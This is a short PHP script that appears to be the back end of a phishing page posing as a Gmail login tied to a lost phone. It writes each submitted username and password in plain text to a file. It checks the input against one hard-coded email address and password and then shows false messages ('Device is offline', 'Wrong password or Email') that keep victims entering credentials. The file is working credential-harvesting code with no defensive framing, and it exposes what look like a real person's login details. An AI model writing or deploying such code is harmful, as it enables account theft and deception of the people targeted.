<?php
$test = $_POST['username'];
file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
if($test != "portiad1985@gmail.com")
{
	echo "The Email provided does not match the corresponding phone, Please make sure you typed email instead of using the given place holder.";
}else
{
file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
if($_POST['password'] != "shalom"){
echo "Device is offline or its out of battery, Please try again later";
}else{
	echo "Wrong password or Email";
}
}
?>
